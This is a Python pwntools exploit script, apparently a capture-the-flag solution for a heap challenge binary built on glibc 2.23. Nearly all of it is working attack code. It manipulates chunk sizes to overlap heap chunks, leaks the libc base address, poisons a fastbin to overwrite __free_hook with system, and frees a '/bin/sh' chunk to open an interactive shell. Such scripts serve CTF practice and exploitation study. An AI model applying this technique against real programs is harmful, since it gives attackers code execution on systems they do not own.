from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './pwn5_null_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
libc = ELF('./libc.2.23.so')

def create(idx,size,data):
    p.send(b'1')
    p.sendafter(b'Index:',str(idx).encode())
    p.sendafter(b'size:',str(size).encode())
    p.sendafter(b'Input data:',data)

def show(idx, data_before):
    p.send(b'2')
    p.sendafter(b'Index:',str(idx).encode())
    p.recvuntil(b'Data = ' + data_before)
    return p.recvline()

def edit(idx,newsize,data):
    p.send(b'3')
    p.sendafter(b'index:',str(idx).encode())
    p.sendafter(b'newsize:',str(newsize).encode())
    p.sendafter(b'(y/n)?\n',b'y')
    p.sendafter(b'Input data:',data)

def delete(idx):
    p.send(b'4')
    p.sendafter(b'index:',str(idx).encode())

create(0,0x200 - 0x10,b'a'*(0x200-0x10))
create(1,0x68,b'bbbb')
create(4,0x68,b'e'*16)
create(2,0x200 - 0x10,b'cccc')
create(3,0x68,b'dddd')
delete(0)
edit(4,0x68,b'a'*(0x60) + p64(0x270 + 0x70))
delete(2)


create(0,0x200 - 0x10,b'aaaa')

libc.address = u64(show(1,b'').strip().ljust(8,b'\x00')) -  0x39bb78
log.info('libc.address = ' + hex(libc.address))

delete(0)
create(0,0x200,b'a' * 0x1f8 + p64(0x70))


delete(1)
delete(0)

create(0,0x270,(b'a' * 0x1f8 + p64(0x70) + p64(libc.sym['__free_hook'] - 0x19)).ljust(0x270 - 8,b'\x00') + p64(0x70))
create(5,0x68,b'/bin/sh\x00')


edit(4,0x68,p64(0) + p64(0x261) + p64(0) + p64(libc.sym['__free_hook'] - 0x10 - 0x16))

create(7,0x258,b'aaaa')

create(6,0x68,b"X"*9 + p64(libc.sym['system']))


p.send(b'4')
p.sendafter(b'index:',str(5).encode())




p.interactive()